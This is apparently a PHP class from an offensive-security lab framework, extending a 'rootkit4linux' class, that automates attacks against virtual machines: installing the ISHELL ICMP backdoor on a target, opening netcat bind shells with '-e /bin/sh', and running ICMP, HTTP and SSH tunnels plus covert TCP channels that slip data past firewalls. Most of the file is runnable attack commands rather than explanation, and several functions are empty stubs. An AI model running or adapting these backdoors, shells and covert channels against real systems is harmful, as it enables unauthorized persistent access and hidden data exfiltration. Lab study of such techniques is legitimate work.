<?php 

/*
SSH Tunneling :
Remote Port Forwarding
SSH remote port forwarding allows us to tunnel a remote port to a local server.
ssh sshserver -R <remote port to bind>:<local host>:<local port>

Local Port Forwarding
SSH local port forwarding allows us to tunnel a local port to a remote server, using SSH as the transport protocol.
ssh sshserver -L <local port to listen>:<remote host>:<remote port>


SSH as SOCKS Proxy
We can use ssh to have a socks proxy to connect to vnc, ssh, rdp if vm is hosting in another vm and then use remmina to access VNC.
ssh -D localhost:9050 user@host
-D [bind_address:]port Specifies a local “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address.  Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine.  Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file.
and
proxychains4 remmina/ rdesktop

VPN-like tunnelling?
sshuttle Transparent proxy server that works as a poor man’s VPN. Forwards over ssh. Doesn’t require admin. Works with Linux and MacOS. Supports DNS tunneling.
So if we have a access to device at 10.1.1.1, and it also has an interface on 192.168.122.0/24 with other hosts behind it, we can run:

# sshuttle -r root@10.1.1.1 192.168.122.0/24
root@10.1.1.1's password:
client: Connected.

This creates a VPN-like connection, allowing me to visit 192.168.122.4 in a browser or with curl, and see the result.



 */


class tunnel4linux extends rootkit4linux{
    var $third_proxy;
    var $third_proxy_port;
  

    public function __construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot,$third_proxy,$third_proxy_port) {
        parent::__construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot);
        $this->third_proxy = trim($third_proxy);
        $this->third_proxy_port = trim($third_proxy_port);
        
    }
    
    
    public function backdoor_linux_icmp() {
        $this->titre(__FUNCTION__);
        $this->backdoor_linux_icmp_server();
        $this->backdoor_linux_icmp_client();
        $cmd1 = "sudo tshark -a duration:20 -i $this->eth_lan -n icmp and \"host $this->target_ip or host $this->attacker_ip\" ";
        $cmd2 = "sudo $this->file_path -i 65535 -t $this->target_port -p 1024 $this->target_ip";
        $this->exec_parallel($cmd1, $cmd2, 3 );
        $this->pause();
    }
    
    public function backdoor_linux_icmp_server() {
        $this->ssTitre(__FUNCTION__);
        $victime = new vm($this->target_vmx_name);
        $victime->vm2upload("$this->dir_tools/Malware/ISHELL-v0.2.tar.gz","$this->vm_tmp_lin/ISHELL-v0.2.tar.gz");
        $this->cmd($this->target_vmx_name, "sudo tar -xvf $this->vm_tmp_lin/ISHELL-v0.2.tar.gz -C /opt " );
        $this->cmd($this->target_vmx_name, "cd /opt/ISHELL-v0.2/; make linux" );
        $this->cmd($this->target_vmx_name, "sudo /opt/ISHELL-v0.2/ishd -i 65535 -t $this->attacker_port -p 1024" );
        $this->pause();
        
    }
    
    
    public function backdoor_linux_icmp_client() {
        $this->ssTitre(__FUNCTION__);
        $this->requette("tar -xvzf $this->dir_tools/Malware/ISHELL-v0.2.tar.gz -C $this->dir_tmp");
        $this->requette("cd $this->dir_tmp/ISHELL-v0.2/; make linux" );
        $this->file_file2virus2vt();
        $this->elf2info();$this->pause();
    }
    
    public function tunnel_tcp2tcp4time(){
        $this->ssTitre(__FUNCTION__);
        // Timeshifter
    }
    
    public function tunnel_http2tcp4cookies(){
        $this->ssTitre(__FUNCTION__);
        
    }
    
    public function tunnel_tcp2tcp4msn(){
        $this->ssTitre(__FUNCTION__);
        // MsnShell
        $this->net("http://gray-world.net/pr_msnshell.shtml");
    }
    
    public function tunnel_rtp(){
        $this->ssTitre(__FUNCTION__);
        // SteganRTP
    }
    public function tunnel_sip(){
        $this->ssTitre(__FUNCTION__);
        // stegosip.py
    }
    
    public function tunnel_icmp4file(){
        $this->ssTitre(__FUNCTION__);
        $this->tunnel_icmp2icmp_server();
        $this->tunnel_icmp2icmp_client();
        $cmd1 = "sudo tcpdump -s 0  -a duration:20 -i $this->eth_lan -n icmp and \"host $this->target_ip or host $this->attacker_ip\"  ";
        $cmd2 = "sudo hping3 --listen $this->user2local -I $this->eth_lan ";
        $this->exec_parallel($cmd1, $cmd2, 0 );
        $this->pause();
    }
    
    public function tunnel_icmp2icmp_server(){
        $this->ssTitre(__FUNCTION__);
        // ###################### ICMP TUNNEL ##########################################
        $this->cmd($this->target_vmx_name, "sudo hping3 $this->attacker_ip -d 100 --icmp --sign $this->user2local  --file $this->file_path -I $this->eth_lan" );
        $this->pause();
    }
   
    
    public function tunnel_icmp2icmp_client(){
        $this->ssTitre(__FUNCTION__);
        $this->cmd($this->attacker_ip, "sudo hping3 --listen $this->user2local -I $this->eth_lan ");
        $this->pause();
    }
    
    public function tunnel_icmp2ssh(){
        $this->ssTitre("SSH via ICMP Tunnel");
        $vm = new VM($this->target_vmx_name);
        $this->cmd("localhost", "sudo tcpdump -s 0  -i $this->eth_lan -w $this->file_dir/tunnel_icmp2tcp.pcap ");
        $file_pcap = "$this->file_dir/tunnel_icmp2tcp.pcap";
        $this->cmd($this->target_vmx_name, "sudo ptunnel -c eth0 -x $this->user2local ");
        $this->pause();
        $cmd1 = "sudo ptunnel -p $this->target_ip -lp $this->attacker_port -da $this->target_ip -dp $this->target_port -v 5 -x $this->user2local -c $this->eth_lan ";
        $cmd2 = "ssh $vm->vm_login@localhost -p $this->attacker_port ";
        $this->exec_parallel($cmd1, $cmd2, 10 );
        $this->pause();
   }
  
   
    public function tunnel_icmp2type(){
        $this->ssTitre( "ICMP: ECHO 		(Request (Type 08), Reply (Type 00)) " );
        $this->ssTitre( "ICMP: Time Stamp 	(Request (Type 13), Reply (Type 14))" );
        $this->ssTitre( "ICMP: Information	(Request (Type 15), Reply (Type 16))" );
        $this->ssTitre( "ICMP: Address Mask 	(Request (Type 17), Reply (Type 18))" );
        $this->backdoor_linux_icmp();
        $this->pause();
    }
    
    public function tunnel_tcp2tcp4ssh(){
        // ENCAPSULATION
        // ###################### SSH TUNNEL ##########################################
        $this->titre("SSH Tunnel");
        $vm = new VM($this->target_vmx_name);
        $this->article("execute from source","ssh -f N -L <source>:<port>:<dest>:<port> user@relay");
        $this->article("execute from dest","ssh -f N -R <source>:<port>:<dest>:<port> user@relay");
        $this->todo("parefeu : autoriser seulement 80 en sortie");
        $this->cmd("localhost","sudo tcpdump -s 0  -i $this->eth_lan host $this->attacker_ip or host $this->target_ip");
        $this->ssTitre("Web");
        $cmd1 = "ssh -f $vm->vm_login@$this->target_ip -N -L 7777:$this->target_ip:80";
        $cmd2 = "wget -qO- http://localhost:7777 ";
        $this->exec_parallel($cmd1, $cmd2, 1 );
        $this->pause();
        
        $this->ssTitre("SSH");
        $cmd1 = "ssh -f $vm->vm_login@$this->target_ip -N -L 6666:$this->target_ip:22";
        $cmd2 = "ssh $vm->vm_login@localhost -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -p 6666 ";
        $this->exec_parallel($cmd1, $cmd2, 1 );
        $this->pause();
        
        $this->ssTitre("Mysql");
        $cmd1 = "ssh -f $vm->vm_login@$this->target_ip -N -L 5555:$this->target_ip:3306";
        $cmd2 = "mysql --user=$this->mysql_login --password=$this->mysql_passwd -h localhost --port=5555 --execute=\"show databases\" ";
        $this->exec_parallel($cmd1, $cmd2, 1 );
        $this->pause();
        // #############################################################################
        
        // ###################### SSL TUNNEL ##########################################
        $this->todo("refaire avec stunnel");
        // stunnel --c --r mail.google.com:443
        // stunnel -P /tmp/ -p stunnel.pem -d 3307 -r localhost:3306
        /*
         * $ stunnel -c -d 8080 -r https://www.google.fr/?gws_rd=ssl
         * $ (echo "HEAD / HTTP/1.0"; echo) | nc localhost 8080
         */
        // #############################################################################
    }
    
    
    
    public function tunnel_tcp2tcp4covert(){
        /*
         Implemented Covert Channels
         • Initial Sequence Number
         • TCP Timestamp low-bit modulation
         – Has high-speed protection
         • Urgent Pointer
         • IP Type of Service
         • TCP Reserved Bits
         */
        $this->titre("Covert TCP");
        $this->img("$this->dir_img/trojan/ip_tcp_header.gif");
        $pcap_output = "$this->file_dir/".__FUNCTION__.".pcap";
        $this->cmd("localhost", "sudo tcpdump -s 0 -i $this->eth_lan -w $pcap_output");$this->pause();
        
        
        $this->ssTitre("Covert TCP - IP Identification - IPID"); // -e frame.number -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e data -T fields
        
        $this->requette("cp -v $this->dir_c/covert_tcp.c $this->dir_tmp");
        $vm = new vm($this->target_vmx_name);
        
        $file_c = new FILE("$this->dir_tmp/covert_tcp.c");       
        $file_c->file_c2elf(""); // compilation : -> -no PIE section .text est fixe en mémoire(PIE désactivé).        
        $vm->vm2upload("$this->dir_tmp/covert_tcp.c", "$this->vm_tmp_lin/covert_tcp.c");
        $this->cmd("localhost", "sudo $this->file_path --help");
        $this->cmd($this->target_vmx_name,"gcc $this->vm_tmp_lin/covert_tcp.c -o $this->vm_tmp_lin/covert_tcp.elf");
        $this->pause();
        $this->requette("echo 'AAAA' > $this->dir_tmp/message_in.txt");
        $this->cmd($this->target_vmx_name,"sudo $this->vm_tmp_lin/covert_tcp.elf -dest $this->attacker_ip -dest_port $this->attacker_port -source $this->target_ip -source_port $this->target_port -file $this->vm_tmp_lin/message_out_ipid.txt -server -ipid ");
        $this->pause();
        $this->requette("sudo $this->file_path -dest $this->target_ip -dest_port $this->target_port -source $this->attacker_ip -source_port $this->attacker_port -file $this->dir_tmp/message_in.txt ");
        $this->pause();
        $this->ssTitre("Covert TCP - TCP initial sequence number - SEQ"); // ip.fragments
        // Stegtunnel
        $this->requette("echo 'BBBB' > $this->dir_tmp/message_in.txt");
        $this->cmd($this->target_vmx_name,"sudo $this->vm_tmp_lin/covert_tcp.elf -dest $this->attacker_ip -dest_port $this->attacker_port -source $this->target_ip -source_port $this->target_port -file $this->vm_tmp_lin/message_out_ipid.txt -server -seq ");
        $this->pause();
        $this->requette("sudo $this->file_path -dest $this->target_ip -dest_port $this->target_port -source $this->attacker_ip -source_port $this->attacker_port -file $this->dir_tmp/message_in.txt -seq");
        $this->pause();
        /*
         * // ne fonctionne pas 
       $this->ssTitre("Covert TCP - TCP acknowledgement sequence number - ACK");
        // tcpdump 'tcp[13] & 16!=0'
       $this->requette("echo 'CCCC' > $this->dir_tmp/message_in.txt");
        $this->cmd($this->target_vmx_name,"sudo $this->vm_tmp_lin/covert_tcp.elf -dest $this->attacker_ip -dest_port $this->attacker_port -source $this->target_ip -source_port $this->target_port -file $this->vm_tmp_lin/message_out_ipid.txt -server -ack ");
        $this->pause();
        $this->requette("sudo $this->file_path -dest $this->target_ip -dest_port $this->target_port -source $this->attacker_ip -source_port $this->attacker_port -file $this->dir_tmp/message_in.txt ");
        $this->pause();
        */
    }
    
    public function tunnel_tcp2tcp4dns(){
        $this->ssTitre(__FUNCTION__);
        //dns2tcp
        // iodine
        // dnscat2
        
    }
    
    
    public function tunnel_voip(){
        $this->ssTitre(__FUNCTION__);
        // VoVoIP
    }
    
    public function install_tunnel_udp_udp2raw(){
        $this->ssTitre(__FUNCTION__);
        if (!file_exists("/opt/udp2raw-tunnel/udp2raw")){
        $this->requette("sudo git clone https://github.com/wangyu-/udp2raw-tunnel.git /opt/udp2raw-tunnel");
        $this->requette("sudo chown $this->user2local:$this->user2local -R /opt/udp2raw-tunnel");
        $this->requette("cd /opt/udp2raw-tunnel; make ; sudo make install");
        }
    }
    
    
    public function tunnel_udp(){
        $this->ssTitre(__FUNCTION__);
        // udp2raw-tunnel
    }
    public function tunnel_arp(){
        $this->ssTitre(__FUNCTION__);
        
    }
    public function tunnel_tcp2udp(){
        $this->ssTitre(__FUNCTION__);
        // udptunnel : Tunnels TCP over UDP packets.
        // https://www.adamcouch.co.uk/tunnel-snmp-check-udp-over-ssh/
    }
    
    public function tunnel_dot(){
        $this->ssTitre(__FUNCTION__);
        
    }
    
    public function tunnel_http2tcp4tunneld(){
        $this->titre("http2tcp");
        $this->tunnel_http2tcp4tunneld_server();
        $this->cmd($this->third_proxy, "nc -lk -p $this->third_proxy_port -e /bin/sh -v");
        $this->pause();
        $this->tunnel_http2tcp4tunneld_client();
        $pcap_output = "$this->file_dir/".__FUNCTION__.".pcap";
        $this->cmd("localhost", "tcpdump -s 0 -i $this->eth_lan -w $pcap_output");$this->pause();
         // python tunnel.py -p <client_port> -r <tunnel_server_host>:<tunnel_server_port> <target_host>:<target_port>    
        $cmd1 = "python $this->dir_tmp/http-tunnel/tunnel.py -p $this->attacker_port -r $this->target_ip:$this->target_port $this->third_proxy:$this->third_proxy_port"; //  $this->ub14041:5353
        $cmd2 = "nc $this->attacker_ip $this->attacker_port -v ";
        $this->exec_parallel($cmd1, $cmd2, 3 );
        $this->pause();
        $pcap_file = new PCAP($pcap_output);
        //$pcap_file->file_pcap2for();    $this->pause();
        
    }
    
    public function tunnel_http2tcp4tunneld_server(){
        $this->ssTitre("tunneld Server");
        $vm = new vm($this->target_vmx_name);
        $this->article("Usage","Start the tunneld server on a remote machine. The server listens on a port specified by parameter -p for HTTP connection from a client program.
The server then read the HTTP payload and send it to the target using TCP connection. The target is specified by the client when establishing the tunnel.
Usually, tunneling will actually be useful when you use the default HTTP port 80 so that the connection from tunnel client to tunnel server is not blocked by firewall.");
        
        $vm->vm2upload("$this->dir_tools/Malware/http-tunnel.tar.gz", "$this->vm_tmp_lin/http-tunnel.tar.gz");       
        $this->cmd("$this->target_vmx_name", "sudo tar -xvf $this->vm_tmp_lin/http-tunnel.tar.gz -C /opt ");
        $this->cmd("$this->target_vmx_name", "sudo python /opt/http-tunnel/tunneld.py -p $this->target_port ");
        $this->pause();
    }
        
    public function tunnel_http2tcp4tunneld_client(){
        $this->ssTitre("tunneld Client");
        $this->requette("tar -xvzf $this->dir_tools/Malware/http-tunnel.tar.gz -C $this->dir_tmp");
        $this->article("Usage","python tunnel.py -p <client_port> -r <tunnel_server_host>:<tunnel_server_port> <target_host>:<target_port>");
        $this->pause();
    }
    
    
    
    public function tunnel_icmp2tcp(){
        $this->ssTitre("ptunnel");
        $vm = new VM($this->target_vmx_name);
        $pcap_output = "$this->file_dir/".__FUNCTION__.".pcap";
        $this->cmd("localhost", "sudo tcpdump -s 0 -i $this->eth_lan -w $pcap_output");$this->pause();
        $this->cmd($this->target_vmx_name, "sudo ptunnel -c eth0 -x $this->user2local ");
        $this->cmd($this->third_proxy, "nc -l -k -p $this->third_proxy_port -v -n -e /bin/sh ");
        
        $this->pause();
        $cmd1 = "sudo ptunnel -p $this->target_ip -lp $this->attacker_port -da $this->third_proxy -dp $this->third_proxy_port -v 5 -x $this->user2local -c $this->eth_lan ";
        switch ($this->target_port){
            case 22 :
                $cmd2 = "ssh $vm->vm_login@localhost -p $this->attacker_port -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o StrictHostKeyChecking=no  ";
                break;
            case 3306 :
                $cmd2 = "mysql -u root -h localhost -p $this->attacker_port ";
                break;
            default :
                $cmd2 = "nc $this->attacker_ip $this->attacker_port -v ";
                break;
                
        }
        
        $this->exec_parallel($cmd1, $cmd2, 10 );
        $this->pause();
    }
    
    public function tunnel_http2tcp4hts() {
        $this->titre(__FUNCTION__);
        $vm = new vm($this->target_vmx_name);
        
        $this->tunnel_http2tcp4hts_server();
        $this->tunnel_http2tcp4hts_client();
        $pcap_output = "$this->file_dir/".__FUNCTION__.".pcap";
        
        $cmd1 = "sudo tcpdump -s 0 -i $this->eth_lan -w $pcap_output";
        //$cmd2 = "ssh $vm->vm_login@localhost -p $this->attacker_port -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 -o StrictHostKeyChecking=no ";
        $cmd2 = "mysql -u $vm->vm_login --host=localhost --port=$this->attacker_port ";
        $this->exec_parallel($cmd1, $cmd2, 5 );
        $this->pause();
        $pcap_file = new PCAP($pcap_output);
        $pcap_file->file_pcap2for();
        $this->pause();
    }
    
    public function tunnel_http2tcp4hts_server(){
        $this->ssTitre("tunneld server");
       $vm = new vm($this->target_vmx_name);
        $vm->vm2upload("$this->dir_tools/Malware/httptunnel-3.0.5.tar.gz", "$this->vm_tmp_lin/httptunnel-3.0.5.tar.gz");
        $this->cmd($this->target_vmx_name, "sudo tar -xvf $this->vm_tmp_lin/httptunnel-3.0.5.tar.gz -C /opt ");
        $this->cmd($this->target_vmx_name, "cd /opt/httptunnel-3.0.5/; ./configure ; make ; sudo make install ");
        $this->ssTitre("Forward ssh to web server port $this->target_port ");
        $this->cmd($this->target_vmx_name, "sudo hts --pid-file /var/run/hts.pid --forward-port localhost:3306 $this->target_port ");
       $this->pause();
        $vm->vm2download("/var/run/hts.pid", "$this->dir_tmp/hts.pid");
        /*
        $pid = file_get_contents("$this->dir_tmp/hts.pid");
        $this->for4linux_Dyn4invest_pid($this->target_vmx_name, $pid);
        $this->for4linux_Dyn4invest_connection($this->target_vmx_name);
        $this->for4linux_Dyn4invest_port($this->target_vmx_name, $this->target_port);
        */
        $this->pause();
       
    }
    
    public function tunnel_http2tcp4hts_client(){
        $this->ssTitre("tunneld client");

        
        if (!file_exists("/usr/bin/htc")) $this->requette("sudo apt install -y httptunnel ");
        $cmd1 = "htc  --forward-port $this->attacker_port $this->target_ip:$this->target_port ";
        $this->cmd("localhost",$cmd1);
        $this->pause();

        
    }
    
    
    
    
}
?>